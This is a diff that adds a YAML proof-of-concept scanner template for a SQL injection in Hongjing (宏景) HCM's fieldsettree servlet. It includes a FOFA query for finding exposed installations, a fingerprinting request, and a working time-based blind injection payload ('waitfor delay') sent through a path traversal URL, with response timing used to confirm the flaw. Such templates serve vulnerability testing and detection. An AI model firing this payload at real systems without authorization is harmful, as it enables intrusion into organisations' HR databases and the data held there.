@@ -1,0 +1,20 @@
+id: poc-yaml-hong-jing-hcm-codesettree-sql
+info:
+  name: 宏景 HCM fieldsettree SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景 HCM
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 302 && contains(headers,`templates/index/hcmlogon.jsp`)
+- method: GET
+  path: /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1';waitfor+delay+'0:0:{{.t1}}'+--
+  expression: status_code == 200 && contains(body,"root") && contains(content_type,"text/xml")
+    && duration > t1 && duration < t2
+transport: http
